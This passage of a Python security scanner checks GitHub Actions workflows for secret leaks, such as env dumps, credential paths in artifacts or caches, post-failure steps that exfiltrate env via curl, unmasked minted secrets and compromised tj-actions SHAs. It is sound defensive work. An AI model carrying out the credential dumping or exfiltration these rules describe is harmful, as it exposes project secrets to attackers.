            line, col = _line_col(text, m.start())
            ln_text = _line_text(text, line)

            # Rule-specific filters.
            if rule_id == "cicd-leak-shell-xtrace":
                if _suppress_xtrace_with_reset(text, line):
                    continue
            elif rule_id == "cicd-leak-env-dump":
                # `env VAR=foo cmd` is NOT a dump — env is a prefix
                # setting one var for one command.
                # Detect: `env<space><WORD>=<...>`
                tail = text[m.end():m.end() + 80]
                if re.match(r"\s+[A-Za-z_][A-Za-z0-9_]{0,40}=", tail):
                    continue
                # `printenv PATH` — single named var, not a dump.
                if re.match(
                    r"\s*printenv\s+[A-Z_][A-Z0-9_]{0,40}\s*$",
                    ln_text.strip(),
                ):
                    continue
                # `env -i bash` — env clearing, NOT a dump.
                if " -i" in m.group(0) or "\t-i" in m.group(0):
                    continue
            elif rule_id == "cicd-leak-verbose-debug-flag":
                # Allow-list for tools whose verbose is content-only.
                if _VERBOSE_ALLOWLIST_RE.search(ln_text):
                    continue
                # Severity tuning: HIGH if a secret-shape co-occurs in
                # the same line, MEDIUM otherwise.
                effective_sev = severity
                if _VERBOSE_AMPLIFIER_RE.search(ln_text) is None:
                    effective_sev = SEV_MEDIUM
                key = (rule_id, line, col)
                if key in seen:
                    continue
                seen.add(key)
                findings.append(_make_finding(
                    rule_id=rule_id,
                    severity=effective_sev,
                    line=line,
                    column=col,
                    matched_text=m.group(0),
                    description=desc,
                    owasp_asi=owasp,
                ))
                continue
            elif rule_id == "cicd-leak-github-script-env-dump":
                # `console.log(process.env.SPECIFIC)` accessor — narrow,
                # MEDIUM not HIGH.
                if re.search(
                    r"process\.env\.[A-Z][A-Z0-9_]{0,40}\b", m.group(0)
                ):
                    # Specific accessor — only flag if it's a secret-name.
                    if not _SECRET_VAR_NAME_RE.search(m.group(0)):
                        continue

            key = (rule_id, line, col)
            if key in seen:
                continue
            seen.add(key)
            findings.append(_make_finding(
                rule_id=rule_id,
                severity=severity,
                line=line,
                column=col,
                matched_text=m.group(0),
                description=desc,
                owasp_asi=owasp,
            ))

    # Also scan for the supplementary patterns that aren't first-class
    # rules but extend an existing rule's coverage.
    _scan_supplementary_text(text, findings, seen)

    findings.sort(key=lambda f: (f.line, f.column, f.rule_id))
    return findings


def _scan_supplementary_text(
    text: str,
    findings: list[Finding],
    seen: set[tuple[str, int, int]],
) -> None:
    """Patterns that share a rule_id with a primary above but cover
    additional shapes (e.g. ${{ secrets.X }} direct emission, deprecated
    set-output form, post-failure exfil curl)."""
    for pat, rule_id, severity in (
        (_OUTPUT_SECRET_EXPR_RE, "cicd-leak-github-output-transform", SEV_HIGH),
        (_SET_OUTPUT_DEPRECATED_RE, "cicd-leak-github-output-transform", SEV_HIGH),
        (_POST_FAILURE_EXFIL_RE, "cicd-leak-post-failure-forensics", SEV_CRITICAL),
        (_COMPROMISED_ACTIONS_RE, "cicd-leak-tj-actions-compromised", SEV_CRITICAL),
    ):
        rule_meta = next((r for r in RULES if r.id == rule_id), None)
        if rule_meta is None:
            continue
        for m in pat.finditer(text):
            line, col = _line_col(text, m.start())
            key = (rule_id, line, col)
            if key in seen:
                continue
            seen.add(key)
            findings.append(_make_finding(
                rule_id=rule_id,
                severity=severity,
                line=line,
                column=col,
                matched_text=m.group(0),
                description=rule_meta.description,
                owasp_asi=rule_meta.owasp_asi,
            ))


# ---- Workflow / structural scanner --------------------------------------


# Hosted runner labels recognised as ephemeral (NOT self-hosted).
_HOSTED_RUNNER_RE = re.compile(
    r"^(?:ubuntu(?:-(?:latest|20\.04|22\.04|24\.04))?"
    r"|macos(?:-(?:latest|11|12|13|14|15))?"
    r"|windows(?:-(?:latest|2019|2022|2025))?)$"
)


# Setup actions that write credentials to known paths.
_CREDENTIAL_WRITING_ACTIONS: frozenset = frozenset({
    "actions/setup-node",
    "actions/setup-python",
    "actions/setup-java",
    "actions/setup-go",
    "actions/setup-dotnet",
    "actions/setup-ruby",
    "docker/login-action",
    "aws-actions/configure-aws-credentials",
    "google-github-actions/auth",
    "azure/login",
})


def _load_yaml(text: str) -> dict:
    try:
        loaded = yaml.safe_load(text)
        return loaded if isinstance(loaded, dict) else {}
    except yaml.YAMLError:
        return {}


def _yaml_value_has_secret(value: Any) -> bool:
    """True iff value (string or nested dict/list) references `secrets.`."""
    if isinstance(value, dict):
        return any(_yaml_value_has_secret(v) for v in value.values())
    if isinstance(value, list):
        return any(_yaml_value_has_secret(v) for v in value)
    if isinstance(value, str):
        return "${{ secrets." in value or "${{secrets." in value
    return False


def _runs_on_is_self_hosted(runs_on: Any) -> bool:
    """True iff `runs-on:` is anything other than a known hosted label."""
    if isinstance(runs_on, str):
        labels = [runs_on.strip()]
    elif isinstance(runs_on, list):
        labels = [str(x).strip() for x in runs_on]
    else:
        return False
    for label in labels:
        if label.lower() == "self-hosted":
            return True
        if not _HOSTED_RUNNER_RE.match(label.lower()):
            # Anything not matching a hosted runner is treated as
            # self-hosted (custom labels are typical for self-hosted
            # pools).
            return True
    return False


def _is_compromised_tj_sha(sha: str) -> bool:
    return sha.lower() in _TJ_ACTIONS_BAD_SHAS


def _line_of_text(text: str, needle: str, start: int = 0) -> int:
    """1-based line of `needle` first occurrence in `text` at/after start."""
    idx = text.find(needle, start)
    if idx < 0:
        return 1
    return text.count("\n", 0, idx) + 1


def _check_upload_artifact_credential_path(
    text: str, data: dict
) -> list[Finding]:
    """Rule 4: actions/upload-artifact path matches a credential path."""
    findings: list[Finding] = []
    jobs = data.get("jobs")
    if not isinstance(jobs, dict):
        return findings
    for job_id, job in jobs.items():
        if not isinstance(job, dict):
            continue
        steps = job.get("steps")
        if not isinstance(steps, list):
            continue
        for step in steps:
            if not isinstance(step, dict):
                continue
            uses = step.get("uses", "")
            if not isinstance(uses, str):
                continue
            if not uses.startswith("actions/upload-artifact"):
                continue
            with_block = step.get("with")
            if not isinstance(with_block, dict):
                continue
            path = with_block.get("path")
            if path is None:
                continue
            # `path:` can be string or YAML list.
            if isinstance(path, list):
                path_str = "\n".join(str(p) for p in path)
            else:
                path_str = str(path)
            if _CREDENTIAL_PATHS_RE.search(path_str):
                line = _line_of_text(text, f"uses: {uses}")
                findings.append(_make_finding(
                    rule_id="cicd-leak-artifact-credential-path",
                    severity=SEV_CRITICAL,
                    line=line,
                    column=1,
                    matched_text=f"upload-artifact path: {path_str[:120]}",
                    description=(
                        f"Job `{job_id}` uploads a credential-laden path "
                        f"as artifact (`{path_str.strip()[:80]}`). "
                        "Artifacts are downloadable by anyone with read "
                        "access to the run. CWE-532 / CICD-SEC-6."
                    ),
                    owasp_asi="ASI-04",
                ))
            elif _BROAD_GLOB_PATHS_RE.search(path_str.strip()):
                line = _line_of_text(text, f"uses: {uses}")
                findings.append(_make_finding(
                    rule_id="cicd-leak-artifact-credential-path",
                    severity=SEV_HIGH,
                    line=line,
                    column=1,
                    matched_text=f"upload-artifact path: {path_str[:120]}",
                    description=(
                        f"Job `{job_id}` uploads via a broad glob "
                        f"(`{path_str.strip()[:80]}`) that could include "
                        "credential files. CWE-532 / CICD-SEC-6."
                    ),
                    owasp_asi="ASI-04",
                ))
    return findings


def _check_cache_credential_path(text: str, data: dict) -> list[Finding]:
    """Rule 5: actions/cache path matches a credential path."""
    findings: list[Finding] = []
    jobs = data.get("jobs")
    if not isinstance(jobs, dict):
        return findings
    for job_id, job in jobs.items():
        if not isinstance(job, dict):
            continue
        steps = job.get("steps")
        if not isinstance(steps, list):
            continue
        for step in steps:
            if not isinstance(step, dict):
                continue
            uses = step.get("uses", "")
            if not isinstance(uses, str):
                continue
            if not (
                uses.startswith("actions/cache@")
                or uses.startswith("actions/cache/save")
                or uses.startswith("actions/cache/restore")
            ):
                continue
            with_block = step.get("with")
            if not isinstance(with_block, dict):
                continue
            path = with_block.get("path")
            if path is None:
                continue
            if isinstance(path, list):
                path_str = "\n".join(str(p) for p in path)
            else:
                path_str = str(path)
            if _CREDENTIAL_PATHS_RE.search(path_str):
                line = _line_of_text(text, f"uses: {uses}")
                findings.append(_make_finding(
                    rule_id="cicd-leak-cache-credential-path",
                    severity=SEV_HIGH,
                    line=line,
                    column=1,
                    matched_text=f"cache path: {path_str[:120]}",
                    description=(
                        f"Job `{job_id}` caches a credential-laden path "
                        f"(`{path_str.strip()[:80]}`) — readable by ANY "
                        "other workflow on the same repo (incl. fork PRs). "
                        "CWE-532 / CICD-SEC-3."
                    ),
                    owasp_asi="ASI-05",
                ))
    return findings


def _check_post_failure_forensics(text: str, data: dict) -> list[Finding]:
    """Rule 9: `if: failure()` / `if: always()` step runs env/cred dump."""
    findings: list[Finding] = []
    jobs = data.get("jobs")
    if not isinstance(jobs, dict):
        return findings
    for job_id, job in jobs.items():
        if not isinstance(job, dict):
            continue
        steps = job.get("steps")
        if not isinstance(steps, list):
            continue
        for step in steps:
            if not isinstance(step, dict):
                continue
            cond = step.get("if")
            if not isinstance(cond, str):
                continue
            cond_l = cond.lower()
            if not (
                "failure()" in cond_l
                or "always()" in cond_l
            ):
                continue
            run = step.get("run", "")
            if not isinstance(run, str):
                continue
            if _POST_FAILURE_DUMP_RE.search(run):
                line = _line_of_text(text, "if: " + cond) or 1
                findings.append(_make_finding(
                    rule_id="cicd-leak-post-failure-forensics",
                    severity=SEV_MEDIUM,
                    line=line,
                    column=1,
                    matched_text=f"if: {cond}",
                    description=(
                        f"Job `{job_id}` has a post-failure cleanup step "
                        f"(`if: {cond}`) that dumps env or credential "
                        "files. Failed runs are more likely to be "
                        "public (fork PR failures). CWE-532 / CICD-SEC-6."
                    ),
                    owasp_asi="ASI-04",
                ))
            elif _POST_FAILURE_EXFIL_RE.search(run):
                line = _line_of_text(text, "if: " + cond) or 1
                findings.append(_make_finding(
                    rule_id="cicd-leak-post-failure-forensics",
                    severity=SEV_CRITICAL,
                    line=line,
                    column=1,
                    matched_text=f"if: {cond}",
                    description=(
                        f"Job `{job_id}` has a post-failure step "
                        f"(`if: {cond}`) that EXFILTRATES env to an "
                        "external URL via curl. CWE-532 / CICD-SEC-6."
                    ),
                    owasp_asi="ASI-04",
                ))
    return findings


def _check_workflow_env_secret(text: str, data: dict) -> list[Finding]:
    """Rule 10: workflow-level `env:` mapping any value with `secrets.X`."""
    findings: list[Finding] = []
    env_block = data.get("env")
    if not isinstance(env_block, dict):
        return findings
    for k, v in env_block.items():
        if not isinstance(v, str):
            continue
        if "${{ secrets." in v or "${{secrets." in v:
            # Multi-job workflow → severity HIGH.
            jobs = data.get("jobs")
            num_jobs = len(jobs) if isinstance(jobs, dict) else 0
            sev = SEV_HIGH if num_jobs > 1 else SEV_MEDIUM
            line = _line_of_text(text, f"{k}:") or _line_of_text(text, "env:")
            findings.append(_make_finding(
                rule_id="cicd-leak-workflow-env-secret",
                severity=sev,
                line=line,
                column=1,
                matched_text=f"env.{k}: {v[:80]}",
                description=(
                    f"Workflow-level `env:` block exposes secret-derived "
                    f"value `{k}` to all {num_jobs} job(s). "
                    "Least-privilege: pin to the smallest needed scope. "
                    "CWE-269 / CICD-SEC-5."
                ),
                owasp_asi="ASI-05",
            ))
    return findings


def _check_mint_without_mask(text: str, data: dict) -> list[Finding]:
    """Rule 11: mint command → emit without intervening ::add-mask::."""
    findings: list[Finding] = []
    jobs = data.get("jobs")
    if not isinstance(jobs, dict):
        return findings
    for job_id, job in jobs.items():
        if not isinstance(job, dict):
            continue
        steps = job.get("steps")
        if not isinstance(steps, list):
            continue
        for step in steps:
            if not isinstance(step, dict):
                continue
            run = step.get("run", "")
            if not isinstance(run, str):
                continue
            mint_m = _MINT_COMMAND_RE.search(run)
            if mint_m is None:
                continue
            emit_m = _MINT_EMIT_RE.search(run, pos=mint_m.end())
            if emit_m is None:
                continue
            # Verify there is no ::add-mask:: between mint and emit.
            between = run[mint_m.end():emit_m.start()]
            if _ADD_MASK_RE.search(between):
                continue
            # No mask → fire.
            line = _line_of_text(text, mint_m.group(0))
            findings.append(_make_finding(
                rule_id="cicd-leak-mint-without-mask",
                severity=SEV_HIGH,
                line=line,
                column=1,
                matched_text=mint_m.group(0)[:120],
                description=(
                    f"Job `{job_id}` step mints a runtime secret with "
                    f"`{mint_m.group(0).strip()[:60]}` and emits the "
                    "value to `$GITHUB_OUTPUT` / `$GITHUB_ENV` without "
                    "first running `echo \"::add-mask::$VALUE\"`. The "
                    "value is unmasked. CWE-532 / CICD-SEC-6."
                ),
                owasp_asi="ASI-04",
            ))
    return findings


def _check_download_then_reupload(text: str, data: dict) -> list[Finding]:
    """Rule 12: download-artifact → upload-artifact in same job with secrets."""
    findings: list[Finding] = []
    jobs = data.get("jobs")
    if not isinstance(jobs, dict):
        return findings
    for job_id, job in jobs.items():
        if not isinstance(job, dict):
            continue
        steps = job.get("steps")
        if not isinstance(steps, list):
            continue
        # Two-pass: find downloads first, then for each upload after a
        # download, check secrets-in-scope.
        download_idx = -1
        for idx, step in enumerate(steps):
            if not isinstance(step, dict):
                continue
            uses = step.get("uses", "")
            if not isinstance(uses, str):
                continue
            if uses.startswith("actions/download-artifact"):
                download_idx = idx
                continue
            if download_idx >= 0 and uses.startswith("actions/upload-artifact"):
                # Check secrets in scope.
                has_secret = (
                    _yaml_value_has_secret(job.get("env"))
                    or _yaml_value_has_secret(data.get("env"))
                    or _yaml_value_has_secret(step.get("env"))
                )
                if has_secret:
                    line = _line_of_text(text, f"uses: {uses}")
                    findings.append(_make_finding(
                        rule_id="cicd-leak-download-then-reupload",
                        severity=SEV_HIGH,
                        line=line,
                        column=1,
                        matched_text=f"upload-artifact after download in `{job_id}`",
                        description=(
                            f"Job `{job_id}` downloads an artifact then "
                            "re-uploads its contents in the same job, "
                            "while having `secrets.*` in scope. "
                            "Re-broadcasts a secret-laden artifact. "
                            "CWE-532 / CICD-SEC-6."
                        ),
                        owasp_asi="ASI-04",
                    ))
    return findings


def _check_job_outputs_secret(text: str, data: dict) -> list[Finding]:
    """Rule 13: job `outputs:` whose value contains `${{ secrets.X }}`."""
    findings: list[Finding] = []
    jobs = data.get("jobs")
    if not isinstance(jobs, dict):
        return findings
    for job_id, job in jobs.items():
        if not isinstance(job, dict):
            continue
        outputs = job.get("outputs")
        if not isinstance(outputs, dict):
            continue
        for k, v in outputs.items():
            if not isinstance(v, str):
                continue
            if "${{ secrets." in v or "${{secrets." in v:
                line = _line_of_text(text, f"{k}:")
                findings.append(_make_finding(
                    rule_id="cicd-leak-job-outputs-secret",
                    severity=SEV_HIGH,
                    line=line,
                    column=1,
                    matched_text=f"outputs.{k}: {v[:80]}",
                    description=(
                        f"Job `{job_id}` declares `outputs.{k}` as a "
                        f"literal `${{{{ secrets.X }}}}` value. "
                        "Job outputs are visible via the workflow_run "
                        "API response, NOT covered by the log mask. "
                        "CWE-532 / CICD-SEC-6."
                    ),
                    owasp_asi="ASI-04",
                ))
    return findings


def _check_self_hosted_no_cleanup(text: str, data: dict) -> list[Finding]:
    """Rule 15: self-hosted runner + credential-writing setup + no cleanup."""
    findings: list[Finding] = []
    jobs = data.get("jobs")
    if not isinstance(jobs, dict):
        return findings
    for job_id, job in jobs.items():
        if not isinstance(job, dict):
            continue
        runs_on = job.get("runs-on")
        if not _runs_on_is_self_hosted(runs_on):
            continue
        steps = job.get("steps")
        if not isinstance(steps, list):
            continue
        # Did any step write credentials?
        wrote_creds = False
        # Did any step's `if: always()` rm them?
        cleaned = False
        for step in steps:
            if not isinstance(step, dict):
                continue
            uses = step.get("uses", "")
            if isinstance(uses, str):
                ref = uses.split("@", 1)[0]
                if ref in _CREDENTIAL_WRITING_ACTIONS:
                    wrote_creds = True
            cond = step.get("if")
            run = step.get("run", "")
            if (
                isinstance(cond, str)
                and "always()" in cond.lower()
                and isinstance(run, str)
                and "rm" in run
                and (
                    "npmrc" in run
                    or "pypirc" in run
                    or "docker" in run
                    or "aws" in run
                    or "kube" in run
                    or "ssh" in run
                    or "netrc" in run
                    or "credentials" in run
                )
            ):
                cleaned = True
        if wrote_creds and not cleaned:
            # YAML 1.1 parses bare `on:` as boolean True — same gotcha
            # the sentinel Workflow model handles.
            triggers = data.get("on")
            if triggers is None and True in data:
                triggers = data[True]
            if triggers is None:
                triggers = {}
            is_pr_triggered = False
            pr_names = ("pull_request", "pull_request_target")
            if isinstance(triggers, dict):
                is_pr_triggered = any(n in triggers for n in pr_names)
            elif isinstance(triggers, list):
                is_pr_triggered = any(n in triggers for n in pr_names)
            elif isinstance(triggers, str):
                is_pr_triggered = triggers in pr_names
            sev = SEV_CRITICAL if is_pr_triggered else SEV_HIGH
            line = _line_of_text(text, "runs-on:")
            findings.append(_make_finding(
                rule_id="cicd-leak-self-hosted-no-cleanup",
                severity=sev,
                line=line,
                column=1,
                matched_text=f"runs-on: {runs_on}",
                description=(
                    f"Job `{job_id}` runs on a self-hosted runner and "
                    "uses a credential-writing setup action without an "
                    "`if: always()` cleanup step that removes the "
                    "credentials. The next workflow run on this runner "
                    "can read them. CWE-1188 / CICD-SEC-7."
                ),
                owasp_asi="ASI-05",
            ))
    return findings


def _check_tj_actions_sha_quarantine(text: str, data: dict) -> list[Finding]:
    """Rule 7 (structural complement): tj-actions/* pinned to a SHA in the
    quarantine list."""
    findings: list[Finding] = []
    jobs = data.get("jobs")
    if not isinstance(jobs, dict):
        return findings
    for job_id, job in jobs.items():
        if not isinstance(job, dict):
            continue
        steps = job.get("steps")
        if not isinstance(steps, list):
            continue
        for step in steps:
            if not isinstance(step, dict):
                continue
            uses = step.get("uses", "")
            if not isinstance(uses, str):
                continue
            if "@" not in uses:
                continue
            ref = uses.split("@", 1)[0]
            if not ref.startswith("tj-actions/"):
                continue
            sha_or_tag = uses.split("@", 1)[1].split("#", 1)[0].strip()
            if _is_compromised_tj_sha(sha_or_tag):
                line = _line_of_text(text, f"uses: {uses}")
                findings.append(_make_finding(
                    rule_id="cicd-leak-tj-actions-compromised",
                    severity=SEV_CRITICAL,
                    line=line,
                    column=1,
                    matched_text=f"uses: {uses}",
                    description=(
                        f"Job `{job_id}` pins {ref} at a SHA in the "
                        "CVE-2025-30066 quarantine list. Update to a "
                        "known-good post-incident SHA. CWE-510 / "
                        "CICD-SEC-3."
                    ),
                    owasp_asi="ASI-05",
                ))
    return findings


# Composition of structural checks.
_STRUCTURAL_CHECKS: tuple = (
    _check_upload_artifact_credential_path,
    _check_cache_credential_path,
    _check_post_failure_forensics,
    _check_workflow_env_secret,
    _check_mint_without_mask,
    _check_download_then_reupload,
    _check_job_outputs_secret,
    _check_self_hosted_no_cleanup,
    _check_tj_actions_sha_quarantine,
)


def scan_workflow(text: str) -> list[Finding]:
    """Run every structural rule on a GitHub Actions workflow YAML.

    Also runs every regex-based rule against the raw text (so a single
    call covers both surfaces). De-duped by (rule_id, line, col).
    """
    if not text:
        return []
    data = _load_yaml(text)
    findings: list[Finding] = list(scan_text(text))
    seen: set[tuple[str, int, int]] = {
        (f.rule_id, f.line, f.column) for f in findings
    }
    for fn in _STRUCTURAL_CHECKS:
        for f in fn(text, data):
            key = (f.rule_id, f.line, f.column)
            if key in seen:
                continue
            seen.add(key)
            findings.append(f)
    findings.sort(key=lambda f: (f.line, f.column, f.rule_id))
    return findings


__all__ = (
    "Finding",
    "Rule",
    "RULES",
    "scan_text",
    "scan_workflow",
)
